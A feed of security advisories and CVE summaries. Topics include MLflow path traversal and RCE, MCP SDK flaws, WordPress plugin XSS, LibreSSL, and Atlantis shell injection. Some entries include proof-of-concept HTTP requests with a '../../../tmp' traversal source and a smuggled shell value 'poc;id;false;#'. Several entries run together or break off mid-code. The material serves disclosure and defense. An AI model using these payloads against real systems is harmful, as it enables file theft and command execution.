items.title: Tabularis before 0.28.0 contains an SQL injection vulnerability in its SQLite driver that allows...
items.summary: Tabularis before 0.28.0 contains an SQL injection vulnerability in its SQLite driver that allows MCP clients to execute stacked statements by supplying a crafted table_name to the describe_table tool. Attackers, including AI agents steered by untrusted content, can close the quoted PRAGMA argument and append statements to read, modify, or drop SQLite data, bypassing read-only mode and write approval.

items.summary: mews/pos through 2.0.0 contains an insufficient verification of data authenticity vulnerability that allows unauthenticated attackers to forge payment results by submitting unverified callbacks. GarantiPos, PayForPos and InterPos 3D Pay and 3D Host handlers skip check3DHash(), letting attackers post tampered status, amount or order ID fields to complete orders without paying.

items.title: The AMP for WP – Accelerated Mobile Pages plugin for WordPress is vulnerable to Stored Cross-Site...
items.summary: The AMP for WP – Accelerated Mobile Pages plugin for WordPress is vulnerable to Stored Cross-Site Scripting via 'headline-*' Shortcode Attribute in all versions up to, and including, 1.1.17 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. A Subscriber-level user can store a malicious shortcode in their biographical info field; because WordPress core's wp_filter_kses() only strips HTML tags and not shortcode syntax, and because AMP content sanitizers run before do_shortcode() processes the archive description, the synthesized markup is never post-sanitized.

items.title: The Pie Register Premium plugin for WordPress is vulnerable to Unrestricted File Type Upload in...
items.summary: The Pie Register Premium plugin for WordPress is vulnerable to Unrestricted File Type Upload in all versions up to, and including, 3.8.4.0 via the piereg_file_upload function. This is due to the plugin performing file type validation via wp_check_filetype and wp_check_filetype_and_ext but never checking whether those validation calls produced errors before move_uploaded_file() is called, combined with no nonce or capability check on the AJAX handler. This makes it possible for unauthenticated attackers to upload files of dangerous types (e.g. PHP scripts) that may be executable, which makes remote code execution possible. The server returns the generated destination filename in the response, giving the attacker the exact path needed to trigger the uploaded file.

items.title: WeKnora before 0.8.2 contains a server-side request forgery vulnerability in isRestrictedIP()...
items.summary: WeKnora before 0.8.2 contains a server-side request forgery vulnerability in isRestrictedIP() that misclassifies NAT64-prefixed IPv6 addresses as public. Authenticated attackers can supply URLs resolving to NAT64 encodings of internal addresses via web_fetch or URL-based knowledge import to reach internal services or cloud metadata endpoints.

items.title: llama.cpp b8841 before b11865 contains an out-of-bounds write vulnerability in the ggml-rpc RDMA...
items.summary: llama.cpp b8841 before b11865 contains an out-of-bounds write vulnerability in the ggml-rpc RDMA transport rdma_recv() function that allows unauthenticated peers to overflow the rpc-server stack. Attackers advertising RDMA capabilities in the HELLO message can send up to 256 KiB into a 1-byte stack variable in rpc_serve_client(), crashing the server or potentially executing code.

items.title: LibreSSL ocspcheck through 4.4.0 contains a CRLF injection vulnerability that allows attackers to...
items.summary: LibreSSL ocspcheck through 4.4.0 contains a CRLF injection vulnerability that allows attackers to inject HTTP headers by embedding CR/LF sequences in a certificate's AIA OCSP URI path. Because url2host() copies the path without rejecting control characters and http_open() places it in the POST request line, attackers can inject headers or split OCSP requests sent to the responder host.

items.title: LibreSSL ocspcheck through 4.4.0 contains a cleartext transmission vulnerability because url2host...
items.summary: LibreSSL ocspcheck through 4.4.0 contains a cleartext transmission vulnerability because url2host() discards the OCSP URL scheme and http_alloc() only selects TLS for port 443. On-path network attackers can read OCSP requests sent to https responder URLs on non-443 ports, exposing certificate serial numbers, issuer hashes, and nonces.

items.title: LibreSSL ocspcheck through 4.4.0 contains a memory exhaustion vulnerability that allows malicious...
items.summary: LibreSSL ocspcheck through 4.4.0 contains a memory exhaustion vulnerability that allows malicious OCSP responders to exhaust memory by sending unbounded HTTP responses. Attackers controlling the responder or intercepting plain HTTP AIA OCSP traffic can stream endless headers or body data to http_head_read() and http_body_read(), denying certificate status checks.

items.title: Xerte Online Toolkits through 3.15.5 contains a remote code execution vulnerability that allows...
items.summary: Xerte Online Toolkits through 3.15.5 contains a remote code execution vulnerability that allows authenticated users with system permission to run PHP by importing a crafted language pack. items.summary: libexpat through 2.9.0 contains a NULL pointer dereference vulnerability in externalEntityInitProcessor2() in lib/xmlparse.c that mishandles the XML_TOK_NONE token from empty input. items.title: LibreSSL through 4.4.0 contains a CRLF injection vulnerability in the libcrypto OCSP_sendreq_new(...
items.summary: LibreSSL through 4.4.0 contains a CRLF injection vulnerability in the libcrypto OCSP_sendreq_new() and OCSP_parse_url() functions, which write unvalidated request paths into the OCSP POST request line. items.title: rtl_433 through 25.12 contains a stack-based buffer overflow vulnerability in proflame2_mc() that...
items.summary: rtl_433 through 25.12 contains a stack-based buffer overflow vulnerability in proflame2_mc() that allows nearby attackers to write past a 7-byte stack buffer by sending more than seven valid Manchester-coded words. Attackers can transmit a crafted OOK radio signal or supply a crafted signal file to crash rtl_433 and corrupt stack memory, enabling control-flow hijacking on builds without stack canaries.

items.title: NexoPOS through 6.3.0 contains a missing authorization vulnerability that allows authenticated...
items.summary: NexoPOS through 6.3.0 contains a missing authorization vulnerability that allows authenticated cashiers to manipulate other cashiers' register sessions because CashRegistersService never compares used_by with the user. items.title: The Ultimate Member – User Profile, Registration, Login, Member Directory, Content Restriction &...
items.summary: The Ultimate Member – User Profile, Registration, Login, Member Directory, Content Restriction & Membership Plugin plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the 'user_url' parameter in all versions up to, and including, 2.14.0 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with subscriber-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. Successful exploitation requires a visitor to click the attacker's Website URL link on their public Ultimate Member profile, a condition that is trivially met since the redirect-confirmation onclick handler is enabled by default on all new installations.

items.summary: The AI Marketing Expert — AI Email Marketing, AI Content Generator, SEO Analyzer, AI Workflow Automation, Social Media & Ai Chatbot plugin for WordPress is vulnerable to Stored DOM-Based Cross-Site Scripting via the 'name' parameter in all versions up to, and including, 1.2.8 due to insufficient input sanitization and output escaping. items.title: nopCommerce before 5.00.0 contains a missing authorization vulnerability in the admin...

items.title: The All-in-One Video Gallery – Video Player & Galleries for YouTube, Vimeo & Self-Hosted Videos...
items.summary: The All-in-One Video Gallery – Video Player & Galleries for YouTube, Vimeo & Self-Hosted Videos plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the 'custom_fields[embedcode]' parameter in all versions up to, and including, 4.9.7 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with subscriber-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. The sanitization bypass is possible because the save_meta_data() handler returns early when $_POST['post_type'] is absent — a condition always true during XML-RPC requests — and the plugin unconditionally grants Subscribers the publish_aiovg_videos capability, making this exploitable by any authenticated user via a single wp.newPost XML-RPC call.

items.title: The affiliate-toolkit – Multi-Network Affiliate & Amazon Product Display plugin for WordPress is...

On a default installation, where that is not configured, the vulnerability requires attackers with contributor-level access and above.

items.title: The Jupiter X Core plugin for WordPress is vulnerable to Authentication Bypass via the Twitter/X...
items.summary: The Jupiter X Core plugin for WordPress is vulnerable to Authentication Bypass via the Twitter/X Social Login handler in all versions up to and including 4.61.0. The vulnerability exists within the verify_twitter_callback function because after exchanging the visitor's oauth_verifier for their access token, the handler never calls setOauthToken() to reassign the returned credentials to the TwitterOAuth client, causing the subsequent account/verify_credentials API call to remain signed with the site operator's stored Access Token and Access Token Secret rather than the authenticating visitor's token. This causes the X API to return the profile of the X application owner instead of the signing-in visitor, and the plugin then resolves and authenticates a WordPress account solely by matching that owner's email address via wp_set_auth_cookie(), allowing unauthenticated attackers to gain authenticated access as the WordPress user whose email corresponds to the X app owner, who is typically the site administrator.

items.title: MLflow vulnerable to arbitrary file read on unauthenticated servers via prompt model version source
items.summary:
### Summary
On MLflow tracking servers running without authentication, which is the default for mlflow server, a remote attacker can read arbitrary files from the server’s filesystem by creating a model version tagged as a prompt whose source is a schemeless local path.

The fix for CVE-2026-2614 in 3.10.0 added a prompt-specific branch to the `CreateModelVersion` handler that rejects `file://` URIs and absolute paths but runs path validation only when the source carries a URL scheme. A schemeless value such as `../../etc`, a plain relative name, `.`, a percent-encoded path, or a Windows drive-letter path is therefore stored unchanged as the model version’s artifact location, and the `model-versions/get-artifact endpoint` later serves files from it with the privileges of the server process. The tag check also keyed on the presence of the `mlflow.prompt.is_prompt` tag rather than its value, so a false value still selected the weaker branch.

Servers using `--app-name basic-auth` are also affected: any authenticated user can create a registered model, so a low-privilege account can use this to read the authentication database, including the admin password hash.

Affected: MLflow 3.10.0 through 3.16.1. Fixed in 3.17.0 by [mlflow/mlflow#25870](https://github.com/mlflow/mlflow/pull/25870), which accepts only MLflow’s own placeholder sources for prompt versions and requires the prompt tag to be `true`.

### Details
When creating a model version with the `mlflow.prompt.is_prompt` tag set to true, the request is handled by the prompt branch in `_create_model_version()`.

`mlflow/server/handlers.py:2674-2690`:
```python
is_prompt = _is_prompt_request(request_message)
if is_prompt:
    source = request_message.source
    parsed = urllib.parse.urlparse(source)
    if parsed.scheme == "file" or (parsed.scheme == "" and source.startswith("/")):
        raise MlflowException(...)
    if parsed.scheme:
        _validate_non_local_source_contains_relative_paths(source)
else:
    if request_message.model_id:
        _validate_source_model(request_message.source, request_message.model_id)
    else:
        _validate_source_run(request_message.source, request_message.run_id)
```
The prompt branch does not call `_validate_source_run()`, `_validate_source_model()`, or `_validate_non_local_source_contains_relative_paths()` for schemeless relative paths.

The artifact-read sink later trusts the stored source:

`mlflow/server/handlers.py:2765-2782`:
```python
def get_model_version_artifact_handler():
    name = request.args.get("name")
    version = request.args.get("version")
    path = request.args["path"]
    path = validate_path_is_safe(path)
    artifact_uri = _get_model_registry_store().get_model_version_download_uri(name, version)
    ...
    else:
        artifact_repo = get_artifact_repository(artifact_uri)
        artifact_path = path

    return _send_artifact(artifact_repo, artifact_path)
```
`_send_artifact()` calls `artifact_repository.download_artifacts(path)` and serves the resulting local file with `send_file()`.

### PoC
Prerequisite: A reachable MLflow tracking server with model registry endpoints enabled.

1. Create a sentinel file on the server:
```bash
printf 'MLFLOW_PWNED_SENTINEL_REPORT' > /tmp/sentinel-mlflow.txt
```

2. Send the following requests to the MLflow server to exploit the traversal:

First, create a registered model:
```http
POST /api/2.0/mlflow/registered-models/create HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/json

{"name": "pwned-model"}
```

Next, create a prompt-tagged model version with the malicious relative source `../../../tmp`:
```http
POST /api/2.0/mlflow/model-versions/create HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/json

{
  "name": "pwned-model",
  "source": "../../../tmp",
  "tags": [{"key": "mlflow.prompt.is_prompt", "value": "true"}]
}
```

items.title: MLflow CrewAI autologging records LLM provider API keys in logged trace spans
items.summary:
### Summary

`mlflow.crewai.autolog()` leaks CrewAI LLM provider API keys into MLflow trace telemetry.

When a CrewAI `Agent` is instrumented with MLflow autologging, MLflow serializes the agent's `__dict__` and converts its fields to strings. The `llm` field contains the CrewAI LLM object, whose string representation includes its `api_key` in plaintext.

As a result, an application that calls `mlflow.crewai.autolog()` can unintentionally send its LLM provider API key to the MLflow trace backend or configured OTLP destination.

The application does not need to explicitly log the credential or place it in a span attribute. The credential is extracted automatically by MLflow's instrumentation.

This was verified on **MLflow 3.16.0** with **CrewAI 1.15.18** using MLflow's own OTLP exporter. The fake credential appeared in **5 attribute locations across 2 spans**.

### Details

The primary issue is in:

`mlflow/crewai/autolog.py::_get_agent_attributes()`

The function walks the CrewAI `Agent.__dict__` and converts agent fields to strings. `tools` and `embedder` receive special handling, but credential-bearing objects such as the following are not sanitized:

* `llm`
* `function_calling_llm`
* `agent_executor`
* `crew`

For example, `agent.llm` is a CrewAI `LLM` object. In CrewAI 1.15.18, the underlying LLM model contains `api_key` as a normal field. Its string representation therefore contains the credential:

```text
llm_type='openai' model='gpt-4.1-mini' ... api_key='sk-proj-...' ...
```

MLflow subsequently stores this string as a span attribute.

There is an important indication that this is an unintended disclosure: MLflow's dedicated LLM attribute extraction already explicitly excludes `api_key` in `_get_llm_attributes()`. The LLM span therefore does not expose the credential, while the broader Agent `__dict__` serialization bypasses that protection.

There is also a second, independent serialization path in:

`mlflow/crewai/autolog.py::_construct_full_inputs()`

This code uses:

```python
v.__dict__ if hasattr(v, "__dict__") else v
```

on call arguments. During CrewAI execution, the `Agent` object is passed as an argument, causing its `__dict__` to be expanded and the credential-bearing LLM object to be included in `mlflow.spanInputs`.

Therefore, there are two independent leakage paths:

1. **Agent span attributes** through `_get_agent_attributes()`
2. **Span inputs** through `_construct_full_inputs()`

Fixing only the Agent attribute serialization would leave the `mlflow.spanInputs` path vulnerable.

A safer approach would be to avoid recursively serializing arbitrary object `__dict__` values. Agent telemetry should use an explicit allowlist of non-sensitive scalar fields, and credential-bearing objects such as `llm`, `function_calling_llm`, `agent_executor`, and `crew` should either be reduced to safe metadata or omitted.

Similarly, `_construct_full_inputs()` should not automatically expand arbitrary objects through `__dict__`, or the resulting values should pass through the same sanitization mechanism before being attached to a span.

### PoC

Environment:

```text
MLflow: 3.16.0
CrewAI: 1.15.18
Python: 3.12.3
opentelemetry-exporter-otlp-proto-http: 1.42.1
```

#### 1. Direct serialization proof

The following demonstrates the vulnerability without starting a Crew, making a network request, or requiring an MLflow server:

```python
import importlib
from crewai import LLM, Agent

autolog = importlib.import_module("mlflow.crewai.autolog")

llm = LLM(
    model="gpt-4.1-mini",
    api_key="sk-proj-EXAMPLE1234567890",
)

agent = Agent(
    role="r",
    goal="g",
    backstory="b",
    llm=llm,
)

attrs = autolog._get_agent_attributes(agent)

assert "sk-proj-EXAMPLE1234567890" in attrs["llm"]

print(attrs["llm"])
```

The output contains the API key in plaintext, for example:

```text
llm_type='openai' model='gpt-4.1-mini' ... api_key='sk-proj-EXAMPLE1234567890' ...
```

No provider request is required.

items.title: MLflow vulnerable to remote code execution on unauthenticated servers via third-party scorer deserialization importing caller-placed artifact modules
items.summary:
## Summary

MLflow 3.12.0 introduced registration and deserialization support for third-party scorers in OSS MLflow. During scorer deserialization, the server accepts a request-controlled Python module path beneath one of four allowed package prefixes, imports that module, obtains a request-controlled class, and instantiates it synchronously.

An HTTP caller can combine this behavior with MLflow's built-in experiment, run, and artifact-upload endpoints:

1. Create an experiment whose local artifact location points to a writable allowed scorer package.
2. Create a run, causing MLflow to allocate `<artifact_location>/<run_id>/artifacts/`.
3. Upload a Python module into that run artifact directory.
4. Submit a serialized third-party scorer whose module path resolves to the uploaded file.
5. Trigger server-side import and class construction through `/ajax-api/3.0/mlflow/scorer/invoke`.

On the default no-auth server using the official MLflow v3.14.0 image, this produces unauthenticated arbitrary Python code execution with the privileges of the MLflow server process. The reproduced image runs the process as uid 0 and permits writes to its installed Python package tree.

The attached proof of concept is intentionally harmless. The uploaded constructor performs one action only: it writes a random marker beside its own uploaded run artifact. The marker is then downloaded through MLflow's run-artifact endpoint and checked for an exact match.

## Technical details

### 1. The allow-list accepts attacker-created descendants

At release commit `86cd7f5a1dc25a1387ad07c87811bbc30f62951c`, `mlflow/genai/scorers/scorer_utils.py` defines these allowed roots:

```python
THIRD_PARTY_SCORER_ALLOWED_MODULES = frozenset({
    "mlflow.genai.scorers.ragas",
    "mlflow.genai.scorers.deepeval",
    "mlflow.genai.scorers.trulens",
    "mlflow.genai.scorers.phoenix",
})
```

In `mlflow/genai/scorers/base.py`, the deserializer accepts either an exact root or any descendant:

```python
module_path == m or module_path.startswith(m + ".")
```

It then performs the following operations using request-controlled values:

```python
module = importlib.import_module(module_path)
scorer_class = getattr(module, class_name, None)
scorer_instance = scorer_class(**init_kwargs)
```

A package-name prefix is not a provenance boundary. If the server process can write below an allowed package, an attacker-created descendant can satisfy the string-prefix check and become importable Python code.

Relevant source locations at the v3.14.0 release commit:

* `mlflow/genai/scorers/scorer_utils.py`, allowed third-party scorer modules
* `mlflow/genai/scorers/base.py`, third-party scorer deserialization and construction

### 2. Deserialization occurs before trace processing

In `mlflow/server/handlers.py`, `_invoke_scorer_handler()` parses the supplied serialized scorer and calls:

```python
scorer = Scorer.model_validate_json(serialized_scorer)
```

Only after deserialization and construction does the handler call:

```python
batches = get_trace_batches_for_scorer(trace_ids, scorer, tracking_store)
```

The attacker-controlled constructor therefore runs before the server validates or resolves the supplied trace IDs.

The minimal proof class is deliberately not a complete MLflow scorer. After its constructor writes the marker, later trace-batching logic accesses scorer attributes that the proof class does not implement. The resulting HTTP 500 occurs after code execution and does not invalidate the proof.

No background job execution or special job-execution server option is required to reach the constructor.

### 3. MLflow's artifact layout places the module under the trusted prefix

The experiment creation endpoint accepts an `artifact_location`. For file-backed experiments, MLflow derives each run artifact directory as:

```text
<artifact_location>/<run_id>/artifacts/
```

items.title: dd-trace: ReDOS in URL query string obfuscation
items.summary:
### Summary

A regular expression used to obfuscate URL query strings can consume excessive CPU when processing certain attacker-controlled input. This can stall request processing and cause denial of service in applications using affected HTTP tracing integrations.

### Details

The default query-string obfuscation pattern can exhibit excessive backtracking. The pattern is applied synchronously when recording HTTP URL metadata, allowing query-string processing to occupy application resources for an extended period.

As a workaround, set DD_TRACE_OBFUSCATION_QUERY_STRING_REGEXP to the fixed regex below, then restart the application.

```
DD_TRACE_OBFUSCATION_QUERY_STRING_REGEXP='(?:(?:"|%22)?)(?:(?:old[-_]?|new[-_]?)?p(?:ass)?w(?:or)?d(?:1|2)?|pass(?:[-_]?phrase)?|secret|(?:api[-_]?|private[-_]?|public[-_]?|access[-_]?|secret[-_]?|app(?:lication)?[-_]?)key(?:[-_]?id)?|token|consumer[-_]?(?:id|key|secret)|sign(?:ed|ature)?|auth(?:entication|orization)?)(?:(?:\s|%20)*(?:=|%3D)[^&]+|(?:"|%22)(?:\s|%20)*(?::|%3A)(?:\s|%20)*(?:"|%22)(?:%2[^2]|%[^2]|[^"%])+(?:"|%22))|(?:bearer(?:\s|%20)+[a-z0-9._\-]+|token(?::|%3A)[a-z0-9]{13}|gh[opsu]_[0-9a-zA-Z]{36}|(?:(?<![\w-])|(?<=%[0-9a-f]{2}))ey[I-L][\w-]+(?:=|%3D)*\.ey[I-L][\w-]+(?:=|%3D)*(?:\.(?:[\w.+/=-]|%3D|%2F|%2B)+)?|-{5}BEGIN(?:[a-z\s]|%20)+PRIVATE(?:\s|%20)KEY-{5}[^\-]+-{5}END(?:[a-z\s]|%20)+PRIVATE(?:\s|%20)KEY(?:-{5})?(?:\n|%0A)?|(?:ssh-(?:rsa|dss)|ecdsa-[a-z0-9]+-[a-z0-9]+)(?:\s|%20|%09)+(?:[a-z0-9/.+]|%2F|%5C|%2B){100,}(?:=|%3D)*(?:(?:\s|%20|%09)+[a-z0-9._-]+)?)'
```

### Proof of concept

Detailed triggering inputs and reproduction steps are omitted from this advisory. The patched version includes regression coverage for the affected behavior.

### Impact

Regular expression denial of service (ReDoS) affecting applications that process attacker-controlled URL query strings through the vulnerable obfuscation pattern. Successful exploitation can cause excessive CPU consumption, prolonged request latency, and service unavailability.

The vulnerable processing is enabled by default for affected HTTP integrations that include query strings in URL span tags.

items.title: TinyMCE Cross-Site Scripting (XSS) vulnerability using media plugin `data-mce-object` serialization
items.summary:
### Impact
Stored XSS vulnerability in the media plugin. Attackers can inject malicious scripts via elements crafted through the data-mce-object attribute, which are created and executed before sanitization. Impacts users of TinyMCE with the media plugin enabled.

### Patches
This vulnerability has been patched in TinyMCE 8.9.3 and TinyMCE 7.9.4 by ensuring that, when using the media plugin, any content created through the data-mce-object attribute is properly sanitized first.

### Workarounds
No official workaround available.

### Fix
To avoid this vulnerability:

Upgrade to TinyMCE 8.9.3 or higher.
Upgrade to TinyMCE 7.9.4 or higher.

### Acknowledgements
Tiny thanks [Fariskhi Vidyan](https://github.com/farisv) and David Vieira Kurz (HiSolutions AG) for their help identifying this vulnerability.

items.title: Model Context Protocol Python SDK: Server bearer-token authentication accepts tokens issued for a different resource server
items.summary:
### Summary
In affected versions, the SDK's server-side bearer authentication had no way to check that a token was issued for your server (its audience). Where one authorization server issues tokens for several services, a valid token for another service was also accepted by your MCP server.

### Am I affected?
Yes, if your HTTP server uses the SDK's bearer authentication (`auth=AuthSettings(...)` with `token_verifier=`), its authorization server also issues tokens for other services, and your `TokenVerifier` does not check the token's audience (`aud`) itself.

Affected versions:

- `mcp` 1.10.0 through 1.29.1
- `mcp` 2.0.0 through 2.1.1

### Fix
Upgrade to:

- 1.x: `mcp` 1.30.0 or later
- 2.x: `mcp` 2.2.0 or later

**Upgrading alone changes nothing.** The patched versions add a `validate_token_resource` setting that is off unless you set it. To turn the check on, make both of these changes together:

1. Set `validate_token_resource=True` in `AuthSettings`, with `resource_server_url` set to the audience your authorization server puts in tokens for your server.
2. Return the token's audience from `verify_token()` as `AccessToken.resource`.

A token for another service then gets `401`. With only the first change, every request gets `401`.

If your `TokenVerifier` already checks the audience, set `validate_token_resource=False` to silence the deprecation warning. The setting will default to `True` in 3.0.

If you cannot upgrade yet, reject any token whose `aud` does not include your server inside `verify_token()`. That closes the issue on every version.

items.title: OpenTelemetry Python: Unbounded memory allocation in Jaeger baggage propagation
items.summary:
## Summary

`JaegerPropagator.extract()` in `opentelemetry-propagator-jaeger` did not enforce limits when extracting inbound `uberctx-*` baggage headers. Attacker-controlled baggage could cause unnecessary CPU work and short-lived heap allocations while processing more data than the propagator should accept.

## Impact

Services that enable the optional Jaeger propagator and accept untrusted inbound propagation headers may experience increased per-request resource usage. This can contribute to denial-of-service risk when transport-level limits are absent or configured above the baggage limits.

The practical impact for most Python web deployments is limited. The package must be installed separately, and the Jaeger propagator is not enabled by the default OpenTelemetry Python configuration.

Common Python web servers also constrain request headers before they reach the propagator:

- Gunicorn allows a maximum of 100 request-header fields and 8,190 bytes per field by default.
- Uvicorn’s h11 implementation limits its incomplete-event buffer to 16,384 bytes by default.

The risk is higher for non-HTTP transports, custom `TextMapGetter` implementations, or deployments where server and gateway limits have been increased or disabled.

The impact is limited to availability. This issue does not expose or modify telemetry data and does not allow code execution.

## Patches

Versions of `opentelemetry-propagator-jaeger` earlier than `1.45.0` are affected.

Upgrade `opentelemetry-propagator-jaeger` to version `1.45.0` or later.

Version `1.45.0` limits extraction to 180 entries and 8,192 total bytes and skips entries larger than 4,096 bytes.

## Credit

tonghuaroot

items.title: Model Context Protocol Python SDK: HTTP client transports followed cross-origin redirects carrying custom headers and bodies
items.summary:
### Summary
In affected versions, the SDK's Streamable HTTP and SSE client transports followed HTTP redirects to any host. If the configured MCP endpoint answered with a redirect to a different origin:

- custom headers set on the client (for example an `X-API-Key` credential) were sent to that origin, and
- on a `307` or `308` redirect the request body was re-sent there too.

The SDK's OAuth client providers followed redirects on their own discovery, registration and token requests in the same way.

A lone `Authorization` bearer header was not exposed; the HTTP library already drops it on cross-origin redirects.

Anyone able to make an endpoint you trust redirect elsewhere (a stale redirect to a lapsed domain, a misrouted proxy rule, redirect logic an attacker can influence) could capture that material. A server that is itself malicious gains nothing this way; it already receives your requests directly.

### Am I affected?
Yes, if your code uses the SDK as an MCP client over HTTP through any of:

- `streamable_http_client` (on 2.x also `Client` given an `http://` or `https://` URL)
- `streamablehttp_client` or `sse_client`
- `ClientSessionGroup` with HTTP server parameters
- the internal `create_mcp_http_client` helper

This includes an HTTP client you passed in yourself with `follow_redirects=True`.

Affected versions: 1.8.0 through 1.29.1, and 2.0.0 through 2.1.1.

Not affected:

- MCP servers
- stdio clients
- a client you supplied with `follow_redirects` left at its default of `False`

### Fix
Upgrade to `mcp` 1.30.0 (1.x) or 2.2.0 (2.x) or later; no code changes are needed.

The transports, and the OAuth providers' own requests, now follow a redirect only when it stays on the endpoint's origin (same scheme, host and port, or an `http` to `https` upgrade on the same host) and keeps the request method. Any other redirect is not followed and the request fails with an error naming the target (`MCPError` on 2.x, `httpx.HTTPStatusError` on 1.x), whichever HTTP client the transport uses. The internal `create_mcp_http_client` helper no longer turns redirect following on, so code calling it directly now receives the redirect response instead.

If your client currently reaches its server through a redirect to another host, including a server that needs no credentials, it will stop connecting after the upgrade: set the endpoint URL to the redirect's target.

Until you can upgrade, supply your own HTTP client with `follow_redirects` left at `False` (`http_client=` on `streamable_http_client`; `httpx_client_factory=` on `sse_client` and `streamablehttp_client`; `ClientSessionGroup` has no such parameter). If a client may already have followed a redirect to a host you do not control, rotate the credentials it carried.

<details>
<summary>If you genuinely need the old behaviour (unsupported)</summary>

This restores what this advisory fixes: redirects to any host are followed again, carrying your custom headers and, on `307`/`308`, the request body, OAuth token requests included. Prefer setting the endpoint URL to the redirect's target. If you cannot, and you accept forwarding credentials to the redirect target, give the transport an HTTP client that follows redirects regardless of what the SDK asks for:

```python
import httpx2  # on 1.x: import httpx and subclass httpx.AsyncClient instead

class FollowRedirectsAnyway(httpx2.AsyncClient):
    """Follows redirects to ANY origin. Deliberately gives up the SDK's same-origin protection."""

    async def send(self, request, *, follow_redirects=False, **kwargs):

http_client = FollowRedirectsAnyway(timeout=httpx2.Timeout(30, read=300))

items.title: Model Context Protocol Python SDK: Client fetched server-chosen $ref URLs while validating tool results against output schemas
items.summary:
### Summary
In affected versions, when a connected MCP server declared an `outputSchema` for a tool, the SDK's client validated each `call_tool` result with `jsonschema`'s default resolver, which fetches any `$ref` it cannot resolve locally by opening the URL. A server could therefore put an `http://`, `https://` or `file://` reference in a tool's output schema and make the client:

- request that URL, or read that local file, from the client's own network position on every call of the tool (the content was used only as a schema and never sent back to the server), and
- stall: the fetch ran synchronously on the event loop with no timeout, so a target that accepted the connection and then went quiet froze every session in the process for as long as it held the connection.

### Am I affected?
Yes, if your application uses the SDK as an MCP client (`ClientSession` over any transport, `ClientSessionGroup`, or the 2.x `Client`) and calls tools on servers you do not fully control. There was no setting that turned the validation off.

Affected versions: 1.10.0 through 1.29.1, and 2.0.0 through 2.1.1.

Not affected: applications that only build servers. If nothing in your code uses `ClientSession`, `ClientSessionGroup` or the 2.x `Client` class, you are not affected.

### Fix
Upgrade to `mcp` 1.30.0 (1.x) or 2.2.0 (2.x) or later. The client now resolves references only within the schema document the server sent (plus the standard JSON Schema metaschemas), so result validation performs no network or file access. A tool whose output schema points outside its own document fails at call time with `RuntimeError` (`Invalid schema for tool ...`); in-document references such as `#/$defs/...` work as before.

Until you can upgrade, call tools only on servers you trust. As a partial stopgap, skip tools whose `outputSchema` contains an `$id`, or a `$ref` / `$dynamicRef` that does not start with `#`.

items.title: Neko: Authorization bypass in legacy WebRTC input handling
items.summary:
### Impact

When legacy mode is enabled and `session.implicit_hosting` is enabled, the legacy WebRTC data channel incorrectly authorizes input events due to a logic error in `LegacyIsHost()`.

As a result, an authenticated room member may be able to send mouse and keyboard input through the legacy WebRTC control channel even when controls are locked or the member would otherwise not be authorized through the modern control API.

The issue affects only the legacy WebRTC input path. The modern HTTP/WebSocket control path correctly enforces authorization checks and is not affected.

To exploit this issue, an attacker must:

* Be authenticated as a room member.
* Successfully establish a WebRTC connection.
* Access a deployment using the legacy WebRTC input handler.

No unauthenticated access or privilege escalation outside the application is possible.

### Patches

The issue has been fixed in **[v3.1.5](https://github.com/m1k1o/neko/releases/tag/v3.1.5)** by correcting the authorization logic in the legacy WebRTC handler.

Users should upgrade to **[v3.1.5](https://github.com/m1k1o/neko/releases/tag/v3.1.5)** or later. Fix: *[395ca1a](https://github.com/m1k1o/neko/commit/395ca1a6f62b7b0e270e654d366a2d57b8042efd)*

### Workarounds

Users who cannot immediately upgrade can mitigate the issue by one of the following:

* Disable legacy mode if it is not required.
* Disable implicit hosting (`session.implicit_hosting=false`).
* Restrict access to trusted authenticated users.

### Credits

Thanks to @KasperBuilds for responsibly disclosing this vulnerability and reaching out directly. This contribution helped strengthen the project, and the whole community benefits from it.

items.title: Atlantis: OS command injection through PR-controlled Terraform workspace enables RCE during plan
items.summary:
### Summary

Atlantis passes the Terraform `workspace` value from a pull request's `atlantis.yaml` into a shell command without quoting or escaping it.

A contributor whose pull request is eligible for an Atlantis plan can include shell metacharacters in the workspace name and execute arbitrary commands as the Atlantis service account. This does not require custom workflows, `allow_custom_workflows`, or permission to run `terraform apply`.

The executed command inherits the Atlantis process environment, which commonly contains cloud-provider, Terraform, and VCS credentials.

### Details

Verified against current `upstream/main` commit `92ce5c51d1a050357e44df3535483425e59fa984` on August 13, 2026.

The vulnerable data flow is:

1. The PR-controlled project workspace is validated in [`server/core/config/raw/project.go`](https://github.com/runatlantis/atlantis/blob/92ce5c51d1a050357e44df3535483425e59fa984/server/core/config/raw/project.go#L139-L149).

   Validation rejects only `..`, `/`, and `\`. Shell metacharacters such as `;`, `#`, `$`, redirections, and whitespace remain permitted.

2. The workspace is passed directly as a Terraform command argument in [`server/core/runtime/workspace_step_runner_delegate.go`](https://github.com/runatlantis/atlantis/blob/92ce5c51d1a050357e44df3535483425e59fa984/server/core/runtime/workspace_step_runner_delegate.go#L86-L96):

   ```go
   []string{workspaceCmd, "select", ctx.Workspace}
   ```

3. Terraform arguments are concatenated into a single string using `strings.Join(args, " ")` in [`server/core/terraform/tfclient/terraform_client.go`](https://github.com/runatlantis/atlantis/blob/92ce5c51d1a050357e44df3535483425e59fa984/server/core/terraform/tfclient/terraform_client.go#L451-L468):

   ```go
   tfCmd := fmt.Sprintf("%s %s", binPath, strings.Join(args, " "))
   ```

4. The resulting string is executed through `sh -c` in [`server/core/terraform/tfclient/terraform_client.go`](https://github.com/runatlantis/atlantis/blob/92ce5c51d1a050357e44df3535483425e59fa984/server/core/terraform/tfclient/terraform_client.go#L416-L427):

   ```go
   cmd := exec.Command("sh", "-c", tfCmd)
   ```

Consequently, a workspace such as:

```text
poc;id;false;#
```

produces commands equivalent to:

```sh
terraform workspace select poc;id;false;#
terraform workspace new poc;id;false;#
```

`raw.Project.Validate()` was confirmed to return no error for this workspace value.

Atlantis documents that planning untrusted Terraform can already be dangerous because providers and external data sources execute code. The distinct issue here is that an ordinary project configuration field becomes shell source, bypassing the explicit `allow_custom_workflows` control and requiring no malicious provider, external data source, custom workflow, or apply operation.

